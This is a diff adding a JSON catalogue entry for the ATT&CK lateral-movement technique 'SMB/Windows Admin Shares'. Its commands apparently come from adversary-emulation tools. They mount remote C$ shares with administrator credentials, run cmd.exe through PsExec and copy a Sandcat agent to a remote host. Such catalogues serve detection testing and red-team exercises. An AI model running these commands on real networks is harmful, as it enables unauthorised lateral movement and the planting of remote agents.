@@ -1,0 +1,34 @@
+   "T1021.002": {
+      "technique_name": "Remote Services: SMB/Windows Admin Shares",
+      "tactic": "lateral-movement",
+      "known implementations": [
+         {
+            "description": "Connecting To Remote Shares\n",
+            "command": "cmd.exe /c \"net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\""
+         },
+         {
+            "description": "Map Admin share utilizing PowerShell\n",
+            "command": "New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$"
+         },
+         {
+            "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n",
+            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -accepteula -c C:\\Windows\\System32\\cmd.exe"
+         },
+         {
+            "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n",
+            "command": "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1"
+         },
+         {
+            "description": "Mounts a network file share on a target computer",
+            "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n"
+         },
+         {
+            "description": "Mount a windows share",
+            "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n"
+         },
+         {
+            "description": "Copy 54ndc47 to remote host (SMB)",
+            "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n"
+         }
+      ]
+   },
